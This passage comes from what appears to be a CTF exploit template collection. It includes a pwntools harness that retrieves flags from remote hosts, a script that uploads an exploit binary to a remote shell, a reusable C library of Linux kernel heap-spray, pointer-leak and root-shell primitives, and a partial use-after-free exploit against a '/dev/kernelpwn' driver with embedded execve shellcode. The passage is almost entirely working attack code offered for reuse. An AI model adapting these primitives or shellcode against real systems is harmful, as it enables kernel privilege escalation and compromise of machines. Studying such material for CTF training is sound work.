port = server_port = int(sys.argv[1].split(':')[1])

p = remote(ip, port)
# p = process("./pwn")
elf = ELF("./pwn")
libc = elf.libc

def dbg():
    gdb.attach(p)
    pause()

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
ia      = lambda                    :p.interactive()
hs256   = lambda data               :sha256(str(data).encode()).hexdigest()
l32     = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
l64     = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
uu32    = lambda                    :u32(p.recv(4).ljust(4,'\x00'))
uu64    = lambda                    :u64(p.recv(6).ljust(8,'\x00'))
int16   = lambda data               :int(data,16)
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))
# sc      = lambda                    :shellcraft.amd64.linux.sh()
#-----------------------------------------------------------------------------------------

def cat_flag():
    flag_header = 'flag{'
    sleep(1)
    sl('cat flag')
    ru(flag_header)
    flag = flag_header + ru('}') + '}'
    write_to_flags(flag + '\n')
    write_to_logs('\nexploited: ' + server_ip.encode() + ':' + str(server_port).encode() + flag)
    exit(0)

def write_to_flags(d):
    fd = open('./flags', 'ab')
    fd.write(d + '\n')
    fd.close()
    
ia()
cat_flag()
```



## kernel

```c
//tips

```



```shell
# attack.sh
#!/bin/sh
gcc exp.c -static -masm=intel -g -o exp
cp exp core/exp
cd core
hen core.cpio
cd ..
./start.sh
```







```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import os

context.arch = "amd64"
context.log_level = 'debug'
cmd = '$ '


def exploit(r):
    r.sendlineafter(cmd, 'stty -echo')
    os.system('gzip -c ./exp > ./exp.gz')
    r.sendlineafter(cmd, 'cat <<EOF > /tmp/exp.gz.b64')
    r.sendline((read('./exp.gz')).encode('base64'))
    r.sendline('EOF')
    r.sendlineafter(cmd, 'base64 -d /tmp/exp.gz.b64 > /tmp/exp.gz')
    r.sendlineafter(cmd, 'gunzip /tmp/exp.gz')
    r.sendlineafter(cmd, 'chmod +x /tmp/exp')
    r.sendlineafter(cmd, "/tmp/exp")
    r.interactive()

if (len(sys.argv) != 3):
    print("python exp.py ip port")
    exit(0)

p = remote(sys.argv[1],sys.argv[2])
exploit(p)
```



exp

板子

```c
# banzi.h
#define _GNU_SOURCE
#include <arpa/inet.h>
#include <assert.h>
#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <keyutils.h>
#include <linux/userfaultfd.h>
#include <poll.h>
#include <pthread.h>
#include <signal.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/ipc.h>
#include <sys/mman.h>
#include <sys/msg.h>
#include <sys/shm.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/xattr.h>
#include <unistd.h>
#include <linux/genetlink.h>
#include <linux/if_packet.h>
#include <linux/netlink.h>
#include <linux/openvswitch.h>
#include <net/ethernet.h>
#include <net/if.h>
#include <sched.h>
#include <stdint.h>
#include <sys/utsname.h>
// #define DEBUG 1
#define COLOR_GREEN "\033[32m"
#define COLOR_RED "\033[31m"
#define COLOR_YELLOW "\033[33m"
#define COLOR_DEFAULT "\033[0m"
#define ELEM_CNT(x) (sizeof(x) / sizeof(x[0]))
#define SYS_SETRESUID_OFFSET (0xd81d0)
#define PREFIX_BUF_LEN (16)
#define logd(fmt, ...) dprintf(2, "[*] %s:%d " fmt "\n", __FILE__, __LINE__, ##__VA_ARGS__)
#define logi(fmt, ...) dprintf(2, COLOR_GREEN "[+] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, __LINE__, ##__VA_ARGS__)
#define logw(fmt, ...) dprintf(2, COLOR_YELLOW "[!] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, __LINE__, ##__VA_ARGS__)
#define loge(fmt, ...) dprintf(2, COLOR_RED "[-] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, __LINE__, ##__VA_ARGS__)
#define die(fmt, ...)                      \
    do {                                   \
        loge(fmt, ##__VA_ARGS__);          \
        loge("Exit at line %d", __LINE__); \
        write(sync_pipe[1], "F", 1);       \
        exit(1);                           \
    } while (0)

int sync_pipe[2];
#ifdef DEBUG
#define debug(...) printf(__VA_ARGS__)
#else
#define debug(...) do {} while (0)
#endif

#define HEAP_MASK 0xffff000000000000
#define KERNEL_MASK 0xffffffff00000000

#define PAGE_SIZE 4096
#define MAX_KEYS 199
#define N_STACK_PPS 30
#define POLLFD_PER_PAGE 510
#define POLL_LIST_SIZE 16
#define NFDS(size) (((size - POLL_LIST_SIZE) / sizeof(struct pollfd)) + N_STACK_PPS);
pthread_t poll_tid[0x1000];
size_t poll_threads;
pthread_mutex_t mutex;
uint64_t usr_cs, usr_ss, usr_rflags;
uint64_t proc_single_show;
uint64_t target_object;
uint64_t kernel_base;

int pipes[0x1000][2];
int seq_ops[0x10000];
int ptmx[0x1000];
int fds[0x1000];
int keys[0x1000];
int corrupted_key;
int n_keys;
int fd;
int s;


struct t_args
{
    int id;
    int nfds;
    int timer;
    bool suspend;
};


struct rcu_head
{
    void *next;
    void *func;
};


struct user_key_payload
{
    struct rcu_head rcu;
    unsigned short	datalen;
    char *data[];
};
void init_namespace(void);
void set_cpu_affinity(int cpu_n, pid_t pid);
void packet_socket_rx_ring_init(int s, unsigned int block_size,
                                unsigned int frame_size, unsigned int block_nr,
                                unsigned int sizeof_priv, unsigned int timeout);


int packet_socket_setup(unsigned int block_size, unsigned int frame_size,
                        unsigned int block_nr, unsigned int sizeof_priv, int timeout);

int pagealloc_pad(int size, int count);

struct poll_list
{
    struct poll_list *next;
    int len;
    struct pollfd entries[];
};



bool is_kernel_pointer(uint64_t addr);


bool is_heap_pointer(uint64_t addr);


void __pause(char *msg);


void save_state();
int randint(int min, int max);
void assign_to_core(int core_id);
void assign_thread_to_core(int core_id);
void init_fd(int i);
void *alloc_poll_list(void *args);
void create_poll_thread(int id, size_t size, int timer, bool suspend);
void join_poll_threads(void);
int alloc_key(int id, char *buff, size_t size);
void free_key(int i);
void free_all_keys(bool skip_corrupted_key);
char *get_key(int i, size_t size);
void alloc_pipe_buff(int i);
void release_pipe_buff(int i);
void alloc_tty(int i);
void free_tty(int i);
void alloc_seq_ops(int i);
void free_seq_ops(int i);
int leak_kernel_pointer(int kid);
int leak_heap_pointer(int kid);
bool check_root();
// typedef struct
// {
//     int64_t idx;
//     uint64_t size;
//     char *buf;    
// }user_req_t;

// struct tpacket_req {
//     unsigned int    tp_block_size;
//     unsigned int    tp_block_nr;
//     unsigned int    tp_frame_size;
//     unsigned int    tp_frame_nr;
// };

// enum tpacket_versions {
//     TPACKET_V1,
//     TPACKET_V2,
//     TPACKET_V3,
// };
// #define PACKET_VERSION 10
// #define PACKET_TX_RING 13
#define ISO_SLAB_LIMIT 8
#define INITIAL_PAGE_SPRAY 500
typedef struct
{
    bool in_use;
    int idx[ISO_SLAB_LIMIT];
}full_page;

enum spray_cmd {
    ALLOC_PAGE,
    FREE_PAGE,
    EXIT_SPRAY,
};

// typedef struct
// {
//     enum spray_cmd cmd;
//     int32_t idx;
//     int32_t size;
//     int32_t n;
// }ipc_req_t;

int shmid[0x1000];
void *shmaddr[0x1000];

void alloc_shm(int i);
int rootfd[2];
int sprayfd_child[2];
int sprayfd_parent[2];
// int socketfds[INITIAL_PAGE_SPRAY];
// int alloc_pages_via_sock(uint32_t size, uint32_t n);

// void spray_comm_handler();

// void send_spray_cmd(enum spray_cmd cmd, int idx,int n);
// void unshare_setup(uid_t uid, gid_t gid);
void errExit(char *msg);
void registerUserfault(void *fault_page,void *handler);

int spray_sendmsg(char *buf,int size,int count);
void hexdump(unsigned char *buff, size_t size);
struct msg_msg {
  uint64_t m_list_next;
  uint64_t m_list_prev;
  uint64_t m_type;
  uint64_t m_ts;
  uint64_t next;
  uint64_t security;
};

struct msg_msgseg {
  uint64_t next;
};
struct {
  long mtype;
  char mtext[0x4000];
} msgbuf;
int msgqid[0x10000];
int add_msg(int msqid, const void *msgp, size_t msgsz);

int show_msg(int msqid, void *msgp,size_t msgsz,long msgtyp);

int free_msg(int msqid, void *msgp, size_t msgsz, long msgtyp);
int msg_get();
void build_msg_msg(struct msg_msg *msg, uint64_t m_list_next,
                   uint64_t m_list_prev, uint64_t m_type,uint64_t m_ts, uint64_t next);
void build_msg(int num);
```



```c
# banzi.c
#include "banzi.h"

void init_namespace(void) {
    int fd;
    char buff[0x100];

    uid_t uid = getuid();
    gid_t gid = getgid();

    if (unshare(CLONE_NEWUSER | CLONE_NEWNS)) {
        die("unshare(CLONE_NEWUSER | CLONE_NEWNS): %m");
    }

    if (unshare(CLONE_NEWNET)) {
        die("unshare(CLONE_NEWNET): %m");
    }

    fd = open("/proc/self/setgroups", O_WRONLY);
    snprintf(buff, sizeof(buff), "deny");
    write(fd, buff, strlen(buff));
    close(fd);

    fd = open("/proc/self/uid_map", O_WRONLY);
    snprintf(buff, sizeof(buff), "0 %d 1", uid);
    write(fd, buff, strlen(buff));
    close(fd);

    fd = open("/proc/self/gid_map", O_WRONLY);
    snprintf(buff, sizeof(buff), "0 %d 1", gid);
    write(fd, buff, strlen(buff));
    close(fd);
}

void set_cpu_affinity(int cpu_n, pid_t pid) {
    cpu_set_t set;

    CPU_ZERO(&set);
    CPU_SET(cpu_n, &set);

    if (sched_setaffinity(pid, sizeof(set), &set) < 0) {
        die("sched_setaffinity: %m");
    }
}

void packet_socket_rx_ring_init(int s, unsigned int block_size,
                                unsigned int frame_size, unsigned int block_nr,
                                unsigned int sizeof_priv, unsigned int timeout) {
    int v = TPACKET_V3;
    int rv = setsockopt(s, SOL_PACKET, PACKET_VERSION, &v, sizeof(v));
    if (rv < 0) {
        die("setsockopt(PACKET_VERSION): %m");
    }

    struct tpacket_req3 req;
    memset(&req, 0, sizeof(req));
    req.tp_block_size = block_size;
    req.tp_frame_size = frame_size;
    req.tp_block_nr = block_nr;
    req.tp_frame_nr = (block_size * block_nr) / frame_size;
    req.tp_retire_blk_tov = timeout;
    req.tp_sizeof_priv = sizeof_priv;
    req.tp_feature_req_word = 0;

    rv = setsockopt(s, SOL_PACKET, PACKET_RX_RING, &req, sizeof(req));
    if (rv < 0) {
        die("setsockopt(PACKET_RX_RING): %m");
    }
}

int packet_socket_setup(unsigned int block_size, unsigned int frame_size,
                        unsigned int block_nr, unsigned int sizeof_priv, int timeout) {
    int s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (s < 0) {
        die("socket(AF_PACKET): %m");
    }

    packet_socket_rx_ring_init(s, block_size, frame_size, block_nr,
                               sizeof_priv, timeout);

    struct sockaddr_ll sa;
    memset(&sa, 0, sizeof(sa));
    sa.sll_family = PF_PACKET;
    sa.sll_protocol = htons(ETH_P_ALL);
    sa.sll_ifindex = if_nametoindex("lo");
    sa.sll_hatype = 0;
    sa.sll_pkttype = 0;
    sa.sll_halen = 0;

    int rv = bind(s, (struct sockaddr *)&sa, sizeof(sa));
    if (rv < 0) {
        die("bind(AF_PACKET): %m");
    }

    return s;
}

int pagealloc_pad(int size, int count) {
    return packet_socket_setup(size, 2048, count, 0, 100);
}

pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;
int add_msg(int msqid, const void *msgp, size_t msgsz) {
	if (msgsnd(msqid, msgp, msgsz, 0) < 0) {
		perror("[-] msgsnd");
    	return -1;
    }
    return 0;
}
void alloc_shm(int i) {
    shmid[i] = shmget(IPC_PRIVATE, 0x1000, IPC_CREAT | 0600);

    if (shmid[i] < 0) {
        perror("[X] shmget fail");
        exit(1);
    }

    shmaddr[i] = (void *)shmat(shmid[i], NULL, SHM_RDONLY);

    if (shmaddr[i] < 0) {
        perror("[X] shmat");
        exit(1);
    }
}
int show_msg(int msqid, void *msgp,size_t msgsz,long msgtyp) {
    if (msgrcv(msqid, msgp, msgsz, msgtyp, MSG_COPY | IPC_NOWAIT) < 0) {
        perror("[-] msgrcv");
        return -1;
    }
    return 0;
}

int free_msg(int msqid, void *msgp, size_t msgsz, long msgtyp) {
    if (msgrcv(msqid, msgp, msgsz, msgtyp, 0) < 0) {
        perror("[-] msgrcv");
        return -1;
    }
    return 0;
}
int msg_get(){
    int pid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
    if(pid < 0){
        perror("msgget");
        return -1;
    }
    return pid;
}
void build_msg_msg(struct msg_msg *msg, uint64_t m_list_next,
                   uint64_t m_list_prev, uint64_t m_type,uint64_t m_ts, uint64_t next) {
  msg->m_list_next = m_list_next;
  msg->m_list_prev = m_list_prev;
  msg->m_type = m_type;
  msg->m_ts = m_ts;
  msg->next = next;
  msg->security = 0;
}
void build_msg(int num){
	for(int i = 0;i < num;i++){
		msgqid[i] = msg_get();
	}
}
int spray_sendmsg(char *buf,int size,int count){
    // char buf[size];
    struct msghdr msgh = {0};
    struct sockaddr_in addr = {0};
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    addr.sin_family = AF_INET;
    addr.sin_port = htons(6666);
 
    // filled with 0x61 'a'
    // memset(buf,'\x00',sizeof(buf));
    // *(uint64_t*)(buf + 8*2) = 0xfff0;
    // *(uint64_t*)(buf + 8*3) = 0xdeadbeef;
    // set user space buf(msg header)
    msgh.msg_control = buf;
    msgh.msg_controllen = size;
    msgh.msg_name = (caddr_t)&addr;
    msgh.msg_namelen = sizeof(addr);
    for(int i = 0;i < count;i++){
      sendmsg(sockfd, &msgh, 0);
    }
}
void registerUserfault(void *fault_page,void *handler)
{
   pthread_t thr;
   struct uffdio_api ua;
   struct uffdio_register ur;
   uint64_t uffd  = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
   ua.api = UFFD_API;
   ua.features    = 0;
   if (ioctl(uffd, UFFDIO_API, &ua) == -1)
      errExit("[-] ioctl-UFFDIO_API");
 
   ur.range.start = (unsigned long)fault_page;
   ur.range.len   = PAGE_SIZE;
   ur.mode        = UFFDIO_REGISTER_MODE_MISSING;
   if (ioctl(uffd, UFFDIO_REGISTER, &ur) == -1)
      errExit("[-] ioctl-UFFDIO_REGISTER");
   int s = pthread_create(&thr, NULL,handler, (void*)uffd);
   if (s!=0)
      errExit("[-] pthread_create");
}
void errExit(char *msg) {
   puts(msg);
   _exit(-1);
}
// int alloc_pages_via_sock(uint32_t size, uint32_t n)
// {
//     struct tpacket_req req;
//     int32_t socketfd, version;

//     socketfd = socket(AF_PACKET, SOCK_RAW, PF_PACKET);
//     if (socketfd < 0)
//     {
//         perror("bad socket");
//         exit(-1);
//     }

//     version = TPACKET_V1;

//     if (setsockopt(socketfd, SOL_PACKET, PACKET_VERSION, &version, sizeof(version)) < 0)
//     {
//         perror("setsockopt PACKET_VERSION failed");
//         exit(-1);
//     }

//     assert(size % 4096 == 0);

//     memset(&req, 0, sizeof(req));

//     req.tp_block_size = size;
//     req.tp_block_nr = n;
//     req.tp_frame_size = 4096;
//     req.tp_frame_nr = (req.tp_block_size * req.tp_block_nr) / req.tp_frame_size;

//     if (setsockopt(socketfd, SOL_PACKET, PACKET_TX_RING, &req, sizeof(req)) < 0)
//     {
//         perror("setsockopt PACKET_TX_RING failed");
//         exit(-1);
//     }

//     return socketfd;
// }

// void spray_comm_handler()
// {
//     ipc_req_t req;
//     int32_t result;

//     do {
//         read(sprayfd_child[0], &req, sizeof(req));
//         assert(req.idx < INITIAL_PAGE_SPRAY);
//         if (req.cmd == ALLOC_PAGE)
//         {
//             socketfds[req.idx] = alloc_pages_via_sock(4096, req.n);
//             printf("%llx\n",socketfds[0]);
//         }
//         else if (req.cmd == FREE_PAGE)
//         {
//             close(socketfds[req.idx]);
//         }
//         result = req.idx;
//         write(sprayfd_parent[1], &result, sizeof(result));
//     } while(req.cmd != EXIT_SPRAY);

// }

// void send_spray_cmd(enum spray_cmd cmd, int idx,int n)
// {
//     ipc_req_t req;
//     int32_t result;

//     req.cmd = cmd;
//     req.idx = idx;
//     req.n = n;
//     write(sprayfd_child[1], &req, sizeof(req));
//     read(sprayfd_parent[0], &result, sizeof(result));
//     assert(result == idx);
// }
// void unshare_setup(uid_t uid, gid_t gid)
// {
//     int temp;
//     char edit[0x100];
//     unshare(CLONE_NEWNS|CLONE_NEWUSER|CLONE_NEWNET);
//     temp = open("/proc/self/setgroups", O_WRONLY);
//     write(temp, "deny", strlen("deny"));
//     close(temp);
//     temp = open("/proc/self/uid_map", O_WRONLY);
//     snprintf(edit, sizeof(edit), "0 %d 1", uid);
//     write(temp, edit, strlen(edit));
//     close(temp);
//     temp = open("/proc/self/gid_map", O_WRONLY);
//     snprintf(edit, sizeof(edit), "0 %d 1", gid);
//     write(temp, edit, strlen(edit));
//     close(temp);
//     return;
// }
void win(void)
{
    if (check_root())
    {
        puts("[+] We are Ro0ot!");
        char *args[] = { "/bin/bash", "-i", NULL };
        execve(args[0], args, NULL);
    }
}
bool is_kernel_pointer(uint64_t addr)
{
    return ((addr & KERNEL_MASK) == KERNEL_MASK) ? true : false;
}


bool is_heap_pointer(uint64_t addr)
{
    return (((addr & HEAP_MASK) == HEAP_MASK) && !is_kernel_pointer(addr)) ? true : false;
}


void __pause(char *msg)
{
    printf("[-] Paused - %s\n", msg);
    getchar();
}


void save_state()
{
    __asm__ __volatile__(
        "movq %0, cs;"
        "movq %1, ss;"
        "pushfq;"
        "popq %2;"
        : "=r" (usr_cs), "=r" (usr_ss), "=r" (usr_rflags) : : "memory" );
}


int randint(int min, int max)
{
    return min + (rand() % (max - min));
}


void assign_to_core(int core_id)
{
    cpu_set_t mask;

    CPU_ZERO(&mask);
    CPU_SET(core_id, &mask);

    if (sched_setaffinity(getpid(), sizeof(mask), &mask) < 0)
    {
        perror("[X] sched_setaffinity()");
        exit(1);
    }
}

void hexdump(unsigned char *buff, size_t size) {
    int i, j;

    for (i = 0; i < size / 8; i++) {
        if ((i % 2) == 0) {
            if (i != 0) printf("  \n");

            printf("  %04x  ", i * 8);
        }

        printf("0x%016lx", ((uint64_t *)(buff))[i]);
        printf("    ");
    }

    putchar('\n');
}

void assign_thread_to_core(int core_id)
{
    cpu_set_t mask;

    CPU_ZERO(&mask);
    CPU_SET(core_id, &mask);

    if (pthread_setaffinity_np(pthread_self(), sizeof(mask), &mask) < 0)
    {
        perror("[X] assign_thread_to_core_range()");
        exit(1);
    }
}


void init_fd(int i)
{
    fds[i] = open("/etc/passwd", O_RDONLY);

    if (fds[i] < 1)
    {
        perror("[X] init_fd()");
        exit(1);
    }
}


void *alloc_poll_list(void *args)
{
    struct pollfd *pfds;
    int nfds, timer, id;
    bool suspend;

    id    = ((struct t_args *)args)->id;
    nfds  = ((struct t_args *)args)->nfds;
    timer = ((struct t_args *)args)->timer;
    suspend = ((struct t_args *)args)->suspend;

    pfds = calloc(nfds, sizeof(struct pollfd));

    for (int i = 0; i < nfds; i++)
    {
        pfds[i].fd = fds[0];
        pfds[i].events = POLLERR;
    }

    assign_thread_to_core(0);

    pthread_mutex_lock(&mutex);
    poll_threads++;
    pthread_mutex_unlock(&mutex);

    debug("[Thread %d] Start polling...\n", id);
    int ret = poll(pfds, nfds, timer);
    debug("[Thread %d] Polling complete: %d!\n", id, ret);
    
    assign_thread_to_core(randint(1, 3));

    if (suspend)
    {   
        debug("[Thread %d] Suspending thread...\n", id);

        pthread_mutex_lock(&mutex);
        poll_threads--;
        pthread_mutex_unlock(&mutex);

        while (1) { };
    }
        
}


void create_poll_thread(int id, size_t size, int timer, bool suspend)
{
    struct t_args *args;

    args = calloc(1, sizeof(struct t_args));

    if (size > PAGE_SIZE)
        size = size - ((size/PAGE_SIZE) * sizeof(struct poll_list));

    args->id = id;
    args->nfds = NFDS(size);
    args->timer = timer;
    args->suspend = suspend;

    pthread_create(&poll_tid[id], 0, alloc_poll_list, (void *)args);
}


void join_poll_threads(void)
{
    for (int i = 0; i < poll_threads; i++)
    {
        pthread_join(poll_tid[i], NULL);
        // open("/proc/self/stat", O_RDONLY);
    }
        
    poll_threads = 0;
}


int alloc_key(int id, char *buff, size_t size)
{
	char desc[256] = { 0 };
    char *payload;
    int key;

    size -= sizeof(struct user_key_payload);

    sprintf(desc, "payload_%d", id);

    payload = buff ? buff : calloc(1, size);

    if (!buff)
        memset(payload, id, size);    

    key = add_key("user", desc, payload, size, KEY_SPEC_PROCESS_KEYRING);

    if (key < 0)
	{
		perror("[X] add_key()");
		return -1;
	}
    	
    return key;
}


void free_key(int i)
{
    if(!keys[i]) puts("Invalid keys[i]");
	
    if(keyctl_revoke(keys[i]) < 0 || keyctl_unlink(keys[i], KEY_SPEC_PROCESS_KEYRING) < 0){
        printf("keys[%d]\n ",i);
        perror("=> ");
        // printf("%d\n")
        return -1;
    }
	
    // n_keys--;
}
void revoke_key(int i)
{
    if(!keys[i]) puts("Invalid keys[i]");
	if(keyctl(KEYCTL_REVOKE, keys[i], 0, 0, 0) < 0){
        printf("keys[%d] ",i);
        perror("=> ");
        return -1;
    }
	// keyctl_unlink(keys[i], KEY_SPEC_PROCESS_KEYRING);
    // n_keys--;
}


void free_all_keys(bool skip_corrupted_key)
{
    for (int i = 0; i < n_keys; i++)
    {   
        if (skip_corrupted_key && i == corrupted_key)
            continue;

        free_key(i);
    }

    sleep(1); // GC keys
}


char *get_key(int i, size_t size)
{
	char *data;

	data = calloc(1, size);
	keyctl_read(keys[i], data, size);
    // printf("%s\n",data);
	return data;
}


void alloc_pipe_buff(int i)
{
    if (pipe(pipes[i]) < 0)
    {
        perror("[X] alloc_pipe_buff()");
        return;
    }

    // if (write(pipes[i][1], "XXXXX", 5) < 0)
    // {
    //     perror("[X] alloc_pipe_buff()");
    //     return;
    // }
}


void release_pipe_buff(int i)
{
    if (close(pipes[i][0]) < 0)
    {
        perror("[X] release_pipe_buff()");
        return;
    }

    if (close(pipes[i][1]) < 0)
    {
        perror("[X] release_pipe_buff()");
        return;
    }
}


void alloc_tty(int i)
{
    ptmx[i] = open("/dev/ptmx", O_RDWR | O_NOCTTY);

    if (ptmx[i] < 0)
    {
        perror("[X] alloc_tty()");
        exit(1);
    }
}


void free_tty(int i)
{
    close(ptmx[i]);
}


void alloc_seq_ops(int i)
{
    seq_ops[i] = open("/proc/self/stat", O_RDONLY);

    if (seq_ops[i] < 0)
    {
        perror("[X] spray_seq_ops()");
        exit(1);
    }
}


void free_seq_ops(int i)
{
    close(seq_ops[i]);
}


int leak_kernel_pointer(int kid)
{
    uint64_t *leak;
    char *key;

    key = get_key(kid, 0xfff0);
    leak = (uint64_t *)key;

    // if (is_kernel_pointer(*leak) && (*leak & 0xfff) == 0x520)
    // {
    //     // corrupted_key = i;
    //     // proc_single_show = *leak;
    //     // kernel_base = proc_single_show - 0xffffffff813275c0;

    //     // printf("[+] Corrupted key found: keys[%d]!\n", corrupted_key);
    //     // printf("[+] Leaked proc_single_show address: 0x%llx\n", proc_single_show);
    //     // printf("[+] Kernel base address: 0x%llx\n", kernel_base + 0xffffffff00000000);
    //     kernel_base = 
        
    //     return 0;
    // }
    for (int i = 0; i < 0xfff0/sizeof(uint64_t); i++)
    {
        // if(is_heap_pointer(leak[i])){
        //     printf("heap_%d ==> 0x%llx\n",i,leak[i]);
        // }
        if (is_kernel_pointer(leak[i]) && (leak[i] & 0xfff) == 0x520)
        {   
            // if (leak[i + 2] == leak[i + 3] && leak[i + 2] != 0)
            // {
            //     target_object = leak[i];
            //     logi("Leaked kmalloc-1024 object: 0x%llx\n", target_object);
            //     return 0;
            // }
            uint64_t kernel_base1 = leak[i] - 0x1ab2520;
            logi("get kernel_base: 0x%llx",kernel_base1);
            return kernel_base1;
        }
    }

    return -1;
}


int leak_heap_pointer(int kid)
{
    uint64_t *leak;
    char *key;

    key = get_key(kid, 0xfff0);
    // hexdump(key,0x100);
    leak = (uint64_t *)key;

    for (int i = 0; i < 0xfff0/sizeof(uint64_t); i++)
    {
        // if(is_heap_pointer(leak[i])){
        //     printf("heap_%d ==> 0x%llx\n",i,leak[i]);
        // }
        if (is_heap_pointer(leak[i]) && (leak[i] & 0xff) == 0x00)
        {   
            if (leak[i + 2] == leak[i + 3] && leak[i + 2] != 0)
            {
                target_object = leak[i];
                logi("Leaked kmalloc-1024 object: 0x%llx", target_object);
                return 0;
            }
        }
    }

    return -1;
}


bool check_root()
{
	int fd;
    
    if ((fd = open("/etc/shadow", O_RDONLY)) < 0)
        return false;
        
    close(fd);
    
    return true;
}
```





exp.c

```c
#include "banzi.h"
int add(int fd,char *buf){
    uint64_t arg[1] = {buf};
    ioctl(fd,0x20,arg);
}
int del(int fd,uint64_t idx){
    uint64_t arg[1] = {idx};
    ioctl(fd,0x30,arg);
}
int main(){
    const char attack_data[] = {106, 104, 72, 184, 47, 98, 105, 110, 47, 47, 47, 115, 80, 72, 137, 231, 104, 114, 105, 1, 1, 129, 52, 36, 1, 1, 1, 1, 49, 246, 86, 106, 8, 94, 72, 1, 230, 86, 72, 137, 230, 49, 210, 106, 59, 88, 15, 5};
    char *buf = calloc(1,0x4000);
    char data[0x1000] = { 0 };
    char key[32] = { 0 };
    uint64_t *rop;
    void *stack;
    char *buff;
    struct msghdr msgh = {0};
    struct sockaddr_in addr = {0};
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    assign_to_core(0);
    save_state();
    fd = open("/dev/kernelpwn",1);
    if(fd < 0){
        puts("Open Error");
        _exit(1);
    }
    puts("[1-1]draining kmalloc-512");
    for(int i = 0;i < 8;i++){
      memset(buf,'a',0x200);
      keys[i] = alloc_key(i,buf,0x110);
    }
    // memset(buf,'b',0x200);
    add(fd,buf);
    del(fd,0);
    puts("[1-2]spray user_key_payload(0x200) and free all keys");
    for(int i = 8;i<73;i++){
      keys[i] = alloc_key(i,buf,0x110);
    }
    for(int i = 0;i<73;i++){
      free_key(i);
    }
    puts("[1-3]spray msg_msg to cross cache attack");
    build_msg(2000);
    memset(msgbuf.mtext,'A',0x200);
    for(int i = 0;i<1000;i++){
      msgbuf.mtype = 1;
      add_msg(msgqid[i],&msgbuf,0x200-0x30);
    }
    for(int i = 0;i<1000;i++){
      msgbuf.mtype = 2;
      add_msg(msgqid[i],&msgbuf,0x400-0x30);
    }
    puts("[1-4]uaf");//此时漏洞对块和msg_msg共用一个堆块
    del(fd,0);
    //通过skb_buffer来占位msg_msg
    puts("[2-1]spray skb_buffer to change msg_msg->m_ts leak heap_addr");
    *(uint64_t*)buf = NULL;
    *(uint64_t*)(buf+8) = NULL;
    *(uint64_t*)(buf+8*2) = 1;
    *(uint64_t*)(buf+8*3) = 0x1000-0x30;
    *(uint64_t*)(buf+8*4) = NULL;
    *(uint64_t*)(buf+8*5) = NULL;
    *(uint64_t*)(buf+8*6) = 0xdeadbeaf;
    *(uint64_t*)(buf+8*7) = 0xdeadbeaf;
    int ss[1000][2];
    for(int i = 0;i < 500;i++){
      if (socketpair(AF_UNIX, SOCK_STREAM, 0, ss[i]) < 0) {
          perror("[-] socketpair");
          return -1;
      }
    }
    for(int i = 0;i<200;i++){
      *(uint64_t*)(buf+8*8) = i;
      if (write(ss[i][0], buf, 0x200-0x140) < 0) {
            perror("[-] write");
            return -1;
      }
    }
    puts("[2-2]leak msg_msg == skb_buffer");//此时msg_msg和skb_buffer会喷在一个对块里面
    int msg_key,skb_key;
    uint64_t heap_addr,heap_addr1;
    for(int i = 0;i<1000;i++){
      show_msg(msgqid[i],buf,0x1000-0x30,0);
      if(*(uint64_t*)(buf+8) == 0xdeadbeaf ){
        msg_key = i;
        skb_key = *(uint64_t*)(buf+8*3);
        printf("msg_key : %d skb_key: %d\n",msg_key,skb_key);
        break;
      }
    }
    puts("[2-3]leak heap_addr");//通过泄漏堆地址来造msg_msg上的任意msg_msg的free
    if(msg_key != 0){
      for(int i = 0;i<(0x1000-0x30)/0x8;i++ ){
        printf("%d => %llx\n",i,*(uint64_t*)(buf + i*8) );
        if(*(uint64_t*)(buf + i*8) == 1 && *(uint64_t*)(buf + (i+1)*8) == 0x1d0 ){
          heap_addr = *(uint64_t*)(buf + (i-2)*8);
          heap_addr1 = *(uint64_t*)(buf + (i-1)*8);
          printf("heap leak: 0x%llx\n",heap_addr);
          break;
        }
      }
    }
    puts("[2-4]free skb_buffer to hijack msg_msg");//造任意msg_msg free
    if (read(ss[skb_key][1], buf, 0x200-0x140) < 0) {
        perror("[-] read");
        return -1;
    }
    *(uint64_t*)buf = heap_addr;
    *(uint64_t*)(buf+8) = heap_addr1;
    *(uint64_t*)(buf+8*2) = 1;
    *(uint64_t*)(buf+8*3) = 0x200-0x30;
    *(uint64_t*)(buf+8*4) = NULL;
    *(uint64_t*)(buf+8*5) = NULL;
    *(uint64_t*)(buf+8*6) = 0xdeadbeaf;
    *(uint64_t*)(buf+8*7) = 0xdeadbeaf;
    for(int i = 200;i<300;i++){
      *(uint64_t*)(buf+8*8) = i;
      if (write(ss[i][0], buf, 0x200-0x140) < 0) {
            perror("[-] write");
            return -1;
      }
    }
    for(int i = 0;i<1000;i++){
      show_msg(msgqid[i],buf,0x200-0x30,0);
      if(*(uint64_t*)(buf+8) == 0xdeadbeaf ){
        // msg_key = i;
        skb_key = *(uint64_t*)(buf+8*3);
        printf("msg_key : %d skb_key: %d\n",msg_key,skb_key);
        break;
      }
    }
    puts("[2-5] free 0x400 msg_msg");
    free_msg(msgqid[msg_key],buf,0x400-0x30,2);
    *(uint64_t*)buf = heap_addr1;
    *(uint64_t*)(buf+8) = heap_addr1;
